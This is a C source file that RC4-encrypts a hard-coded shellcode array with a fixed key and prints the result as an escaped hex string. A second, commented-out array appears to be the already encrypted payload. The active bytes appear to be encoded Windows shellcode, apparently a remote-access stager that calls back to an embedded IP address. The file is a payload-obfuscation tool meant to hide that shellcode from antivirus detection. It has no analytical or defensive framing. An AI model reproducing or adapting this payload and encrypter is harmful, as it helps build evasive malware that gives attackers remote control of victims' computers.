#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct rc4_state
{
    int x, y, m[256];
};

void rc4_setup(struct rc4_state* s, unsigned char* key, int length);
void rc4_crypt(struct rc4_state* s, unsigned char* data, int length);

void rc4_setup(struct rc4_state* s, unsigned char* key, int length)
{
    int i, j, k, * m, a;

    s->x = 0;
    s->y = 0;
    m = s->m;

    for (i = 0; i < 256; i++)
    {
        m[i] = i;
    }

    j = k = 0;

    for (i = 0; i < 256; i++)
    {
        a = m[i];
        j = (unsigned char)(j + a + key[k]);
        m[i] = m[j]; m[j] = a;
        if (++k >= length) k = 0;
    }
}

void rc4_crypt(struct rc4_state* s, unsigned char* data, int length)
{
    int i, x, y, * m, a, b;

    x = s->x;
    y = s->y;
    m = s->m;

    for (i = 0; i < length; i++)
    {
        x = (unsigned char)(x + 1); a = m[x];
        y = (unsigned char)(y + a);
        m[x] = b = m[y];
        m[y] = a;
        data[i] ^= m[(unsigned char)(a + b)];
    }

    s->x = x;
    s->y = y;
}

int main()
{
    
    unsigned char key[] = { 'c', 'a', 'i', 'g', 'o', 'u', '1', '1' };
    unsigned char shellcode[] = "\x37\x83\x48\x2f\x3b\x23\x03\xcb\xcb\xcb\x8a\x9a\x8a\x9b\x99\x9a\x9d\x83\xfa\x19\xae\x83\x40\x99\xab\x83\x40\x99\xd3\x83\x40\x99\xeb\x83\x40\xb9\x9b\x83\xc4\x7c\x81\x81\x86\xfa\x02\x83\xfa\x0b\x67\xf7\xaa\xb7\xc9\xe7\xeb\x8a\x0a\x02\xc6\x8a\xca\x0a\x29\x26\x99\x8a\x9a\x83\x40\x99\xeb\x40\x89\xf7\x83\xca\x1b\xad\x4a\xb3\xd3\xc0\xc9\xbe\xb9\x40\x4b\x43\xcb\xcb\xcb\x83\x4e\x0b\xbf\xac\x83\xca\x1b\x9b\x40\x83\xd3\x8f\x40\x8b\xeb\x82\xca\x1b\x28\x9d\x83\x34\x02\x8a\x40\xff\x43\x83\xca\x1d\x86\xfa\x02\x83\xfa\x0b\x67\x8a\x0a\x02\xc6\x8a\xca\x0a\xf3\x2b\xbe\x3a\x87\xc8\x87\xef\xc3\x8e\xf2\x1a\xbe\x13\x93\x8f\x40\x8b\xef\x82\xca\x1b\xad\x8a\x40\xc7\x83\x8f\x40\x8b\xd7\x82\xca\x1b\x8a\x40\xcf\x43\x83\xca\x1b\x8a\x93\x8a\x93\x95\x92\x91\x8a\x93\x8a\x92\x8a\x91\x83\x48\x27\xeb\x8a\x99\x34\x2b\x93\x8a\x92\x91\x83\x40\xd9\x22\x84\x34\x34\x34\x96\xa1\xcb\x82\x75\xbc\xa2\xa5\xa2\xa5\xae\xbf\xcb\x8a\x9d\x82\x42\x2d\x87\x42\x3a\x8a\x71\x87\xbc\xed\xcc\x34\x1e\x83\xfa\x02\x83\xfa\x19\x86\xfa\x0b\x86\xfa\x02\x8a\x9b\x8a\x9b\x8a\x71\xf1\x9d\xb2\x6c\x34\x1e\x20\xb8\x91\x83\x42\x0a\x8a\x73\x9b\xcb\xcb\xcb\x86\xfa\x02\x8a\x9a\x8a\x9a\xa1\xc8\x8a\x9a\x8a\x71\x9c\x42\x54\x0d\x34\x1e\x20\x92\x90\x83\x42\x0a\x83\xfa\x19\x82\x42\x13\x86\xfa\x02\x99\xa3\xcb\xc9\x8b\x4f\x99\x99\x8a\x71\x20\x9e\xe5\xf0\x34\x1e\x83\x42\x0d\x83\x48\x08\x9b\xa1\xc1\x94\x83\x42\x3a\x83\x42\x11\x82\x0c\x0b\x34\x34\x34\x34\x86\xfa\x02\x99\x99\x8a\x71\xe6\xcd\xd3\xb0\x34\x1e\x4e\x0b\xc4\x4e\x56\xca\xcb\xcb\x83\x34\x04\xc4\x4f\x47\xca\xcb\xcb\x20\x18\x22\x2f\xca\xcb\xcb\x23\x69\x34\x34\x34\xe4\xa9\xf9\x93\xba\xcb\xd6\x8e\x87\x90\x67\xde\x89\x8a\x7d\xfd\x2e\x09\x3f\x31\x85\x18\x0e\xbe\xba\x3b\x58\x0a\x88\xb0\x67\x6a\xec\x41\x3f\x54\xb0\x1f\x31\x83\x4e\x2b\x6e\xa8\x7c\x7a\xe9\x5d\x16\xcd\x11\x28\xd8\x0b\xdb\x14\x93\xc3\xa0\x0e\xaa\xc5\xcb\x66\x8c\x80\xb9\xeb\xcc\x85\x47\xcd\x94\x0e\x0d\x60\x97\x94\x47\xcb\x9e\xb8\xae\xb9\xe6\x8a\xac\xae\xa5\xbf\xf1\xeb\x86\xa4\xb1\xa2\xa7\xa7\xaa\xe4\xfe\xe5\xfb\xeb\xe3\xa8\xa4\xa6\xbb\xaa\xbf\xa2\xa9\xa7\xae\xf0\xeb\x86\x98\x82\x8e\xeb\xf2\xe5\xfb\xf0\xeb\x9c\xa2\xa5\xaf\xa4\xbc\xb8\xeb\x85\x9f\xeb\xfd\xe5\xfa\xf0\xeb\x9f\xb9\xa2\xaf\xae\xa5\xbf\xe4\xfe\xe5\xfb\xf0\xeb\x86\x8a\x87\x88\xe2\xc6\xc1\xcb\xb5\x4c\xe4\x3c\x8b\x60\xc6\xbe\x32\xe2\x96\x51\x9a\xf4\x42\xe9\x04\x64\xda\x6c\xcb\x1b\xdc\x83\xeb\x8e\x40\xfc\x1c\x4b\xa5\x7b\x41\xfb\xbf\xa8\x8f\x62\x91\x5d\xcc\xf5\xe3\xd8\x8f\xea\x4a\xa9\xc6\x8f\x25\xd5\x62\x68\x9f\x28\xd1\x2e\xf9\xfd\xec\x40\xb2\x50\xc4\xa8\x72\x21\x93\x74\xe9\xb8\xfd\x23\xb5\x6e\x0c\xa4\xed\xfa\xbb\xba\x41\x1b\xd5\xea\x26\x09\x5a\x1f\x4b\x0c\x0e\x27\x78\x8d\x21\x19\x7a\x24\x09\x1b\x0b\x00\x48\x37\x49\x50\x12\xd8\xbb\xfc\x49\x22\x59\x56\x27\x1e\x06\xc6\x6f\xfe\xba\xda\xdb\xe7\x85\x6c\xcf\x55\xe3\xb7\x25\xbf\x21\x2a\xb0\xf3\xad\xc9\x3a\xad\x87\xee\xd1\xe7\xa9\x3a\x47\xb2\x68\x1e\xcf\x1d\x38\x12\xec\x54\x94\x2e\x31\xee\x01\x1d\x9b\xd3\x73\x83\xb0\x60\xc6\xec\x93\xe0\x61\x62\xdc\xd5\x40\x15\x0d\x58\x9f\x09\xb5\x44\x05\x24\x59\xc3\x29\xdb\x3b\x7e\xb1\xba\xa0\xa5\xc9\x6e\x6a\x97\x82\x72\xe5\x6c\x49\xf7\x07\xe7\x4e\xed\xa2\x59\x91\x8a\x93\xb3\x8d\xcb\x8a\x75\x3b\x7e\x69\x9d\x34\x1e\x83\xfa\x02\x71\xcb\xcb\x8b\xcb\x8a\x73\xcb\xdb\xcb\xcb\x8a\x72\x8b\xcb\xcb\xcb\x8a\x71\x93\x6f\x98\x2e\x34\x1e\x83\x58\x98\x98\x83\x42\x2c\x83\x42\x3a\x83\x42\x11\x8a\x73\xcb\xeb\xcb\xcb\x82\x42\x32\x8a\x71\xd9\x5d\x42\x29\x34\x1e\x83\x48\x0f\xeb\x4e\x0b\xbf\x7d\xad\x40\xcc\x83\xca\x08\x4e\x0b\xbe\x1c\x93\x93\x93\x83\xce\xcb\xcb\xcb\xcb\x9b\x08\x23\x54\x36\x34\x34\xfa\xf2\xf9\xe5\xfa\xfd\xf3\xe5\xfa\xff\xfb\xe5\xfa\xf9\xf2\xcb\xec\x77\x4d\x61";
    //unsigned char shellcode[] = "\x57\x7a\x6b\xd3\x9b\x55\x35\x0f\xbd\xdf\x29\x28\x76\xfe\xff\x3e\x78\xb7\xf2\xce\x14\x80\xac\xde\x9c\x26\x5c\xfc\x79\x50\x5a\x1a\xe9\x58\x5b\x6e\x2d\x26\x9b\x0e\x4d\xda\x9a\xec\x96\xc4\xd8\x8d\x15\xb6\xbb\x84\xdd\xbd\x9b\x7e\xa0\x0d\x83\x4a\x0b\xc2\xbd\xa1\xe8\x11\x55\xea\x62\x0d\x49\xd5\x6e\x15\x4a\xd3\x7e\x44\x66\xeb\x25\x0e\x96\xaa\x45\x54\x94\xa1\x35\x0d\x3d\xca\xb6\x1f\x0e\x04\xef\x07\xea\x34\x05\xd8\x2a\xea\x79\x44\xf0\xcb\xf0\x9e\x27\xb4\x11\x18\x39\x21\xeb\x12\x56\x02\x78\xe0\x83\x3a\x19\x4a\xdf\xad\xe3\x3b\x97\x98\xf2\xe9\x75\x16\xf2\xad\xb6\x1f\xee\x2f\xe7\xec\x8a\x82\x64\xea\xab\x10\x56\x7e\xc2\xff\x19\x58\x87\x69\xf8\xe4\x70\xcc\x04\x28\x9a\xa0\x13\x1a\x4d\x73\x20\x4e\xf7\x37\xac\x9e\xaa\x76\xbe\x93\xf1\x49\xc4\x88\xc7\xfb\x64\xcd\x2b\x7f\xec\xf8\x68\xaa\x4e\xd6\x10\xc4\xe9\x3e\x29\x9a\x66\x6e\xe6\x95\x6d\xaf\x61\xbd\x06\x25\xbc\xc1\xce\xb2\x5c\xbe\x57\x0f\x15\x4c\x2f\x41\xb6\x88\xf5\x27\xa0\xda\x64\xa8\x31\xcc\xbd\xba\xd9\x63\x68\x65\xea\x7f\xb2\x8a\xe3\xd7\x83\x30\x53\xc3\x3c\x11\x03\xf8\x8d\xef\x84\xb9\x01\x63\x59\x0e\x1b\xd8\x57\x5b\xcf\xfd\xa8\x30\x73\xaf\x90\x31\xf6\x05\x78\x55\x90\x5e\x17\x43\x69\x85\xb8\xab\xee\xa1\xab\x79\xc6\x6d\x94\x20\x52\xd7\x60\xab\x50\xac\x29\xc2\x9c\x73\xfd\x17\x68\x86\x75\x38\xeb\xce\xdd\x24\x0f\x54\x38\x4a\x29\x89\x45\xa0\xdc\x39\x35\xba\xa2\x86\xcb\xd2\x93\xe7\x92\x6b\x60\x09\xb3\xbf\x6c\x0b\xe7\x42\x0b\xbb\x6a\x10\x27\x0e\x95\x87\xcf\x5a\x2f\x72\xbf\x45\x4a\xef\xc5\x10\x17\xa2\xd2\xa2\x69\x59\x76\xd9\x34\x87\xab\x95\x27\x4f\x35\x51\xec\xc3\x42\x73\x13\x01\x88\xba\x89\x76\xe1\xdc\xef\xd1\xd9\x78\x16\x2c\x57\x07\xc7\xe9\xf1\x59\x0a\x62\xa8\xbf\xbe\x6f\x10\xc0\xad\x63\x59\xe6\x1c\xb9\xf0\x89\xb2\xd6\x56\x8d\x5b\xb8\xf6\x0e\x8b\xa2\x01\x15\x3a\xe7\x0d\xf7\xe6\x3b\x17\x92\xdf\xab\xd3\x2d\x56\xcc\xb3\x69\x55\xd5\xc9\xbb\x68\x81\x07\x67\x45\xb0\x64\x20\x3a\x5c\x31\xaf\x2f\x80\x90\xf8\xd0\x78\x91\x2f\x30\xb5\xc2\x72\xbe\x76\x7b\xe7\xac\xd8\xd7\x0f\x00\x1d\x1e\x4c\xd5\xe8\x12\x76\xd4\xbb\xe2\x10\xe3\x7b\xa4\x81\x87\xf3\x73\xf3\x30\xed\x54\x47\x50\xc5\xb6\x7a\x86\xfa\xff\xde\x3b\xd5\x00\x94\xcd\x42\x1a\x66\x72\xfd\xfa\x56\x00\x3f\xb8\x36\xff\x7d\x57\x21\x76\x29\x2c\x07\x21\xcd\x2b\x49\x9e\x45\x71\x02\x58\x9f\x55\x3c\x04\x71\x3b\x8d\x48\x6f\x1b\x33\x49\x42\xc0\xab\x5d\x8c\xe5\x58\x79\xe0\xd6\xe6\x06\xe8\x90\x13\x13\x8e\x66\x23\x7e\xb3\xc0\x1d\x05\xe1\x06\x43\x12\xe7\xca\xae\x08\xa7\xbc\xb9\x1b\x89\x04\xb8\xd3\x1a\x92\x84\x1b\xa8\x80\xb6\x6a\x16\xa1\x3f\x17\x72\xd1\xfc\x3b\xe2\x48\xdb\x35\xef\xad\x16\x4f\x39\xf9\x53\xe2\xc9\x94\xdd\x36\xef\x50\x2e\xdb\xb7\xbc\x51\x8e\x1a\x4b\x66\xb5\xfa\x31\x8e\xa8\x3a\x71\xeb\x8e\x24\x43\x33\xc5\x7f\x34\x9e\xd9\xf4\x36\xcd\xb6\x1d\x2a\x46\x5b\xa4\x38\x7f\x1b\x2e\x13\x9f\x18\xf3\x0a\xab\x44\xc7\x77\x20\xc3\x7d\x85\xc5\xb9\x22\x44\x35\xbf\x16\x50\xf4\x87\xb0\x42\x8b\xf2\x91\xdd\xe1\x6e\x3b\x93\x1b\xba\x5d\xa0\xb3\xb7\xb1\xf5\x2a\x4c\x80\x90\xd8\x89\x9f\xe7\x89\x40\x49\x51\x8b\x58\x43\x3f\x4f\x8c\xe1\x15\x6a\x7b\x98\x4e\xf1\x6d\xc3\xf3\x6a\xd1\x1d\xd9\x2d\x42\xad\xa6\xb3\x23\xa2\xfb\x09\x4e\x1b\x73\x63\x4a\x6a\x32\x7f\x6e\x67\x55\x06\x55\x44\xe8\x9c\x8c\x42\xe1\x13\xe5\xc8\x89\x2c\x45\x1a\x70\xf3\x2d\x84\xd3\x9b\x91\xf6\x00\xca\x85\x2c\x0b\xed\x42\x02\x58\x84\x86\xed\x87\xd4\x11\x9d\xa2\x13\x87\x51\x95\x53\xcb\x81\xf1\xf0\x8d\xf1\x0a\x85\x35\x78\x1a\x3c\x8d\x5f\xe1\x07\xc0\x11\xfc\x37\x99\x7e\x30\x73\x9f\xe4\x11\xc3\x3a\x4d\x73\x20\xdd\x9f\x4e\x3e\x44\xa8\xb8\x55\xdf\xf7\xa7\xc9\xd1\x9a\x95\x83\x7d\x73\x0a\xd5\xc8\x8f\xc3\x97\x26\x7c\x91\x41\x9f\x85\xac\x0c\x19\xcc\xfb\x17\xed\x75\xdc\x2b\x7b\x61\x3f\xe8\x93\xe4\xbf\xd7\xe6\x8e\x66\x1d\xa9\x92";

    struct rc4_state* s;
    s = (struct rc4_state*)malloc(sizeof(struct rc4_state));

    printf("key : %s\n", key);
    //printf("raw : %s\n", shellcode);

    rc4_setup(s, key, sizeof(key) - 1);

    rc4_crypt(s, shellcode, sizeof(shellcode) - 1);

    printf("encrypted  : ");
    for (int i = 0; i < sizeof(shellcode) - 1; i++) {
        printf("\\x%02x", shellcode[i]);
    }
    printf("\n");
    /*
    rc4_setup(s, key, sizeof(key) - 1);
    
    rc4_crypt(s, shellcode, sizeof(shellcode) - 1);
    printf("decrypted  : %s\n", shellcode);
    */

    free(s);


    

    return 0;
}
